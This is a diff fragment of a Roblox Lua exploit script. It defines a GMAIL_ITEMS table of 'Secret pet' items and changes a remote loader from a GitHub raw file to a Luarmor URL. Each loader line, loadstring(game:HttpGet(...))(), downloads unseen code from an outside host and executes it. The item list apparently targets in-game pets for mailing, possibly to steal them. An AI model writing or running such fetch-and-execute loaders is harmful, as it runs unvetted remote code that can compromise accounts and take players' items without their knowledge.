@@ -52,4 +52,4 @@ getgenv().GMAIL_ITEMS = {
     ["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
     ["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},
 }
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/02941832ce3bf5a4cb96b9f8da0c98e08c45546d/gscripts.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/34915da4ad87a5028e1fd64efbe3543f.lua"))()
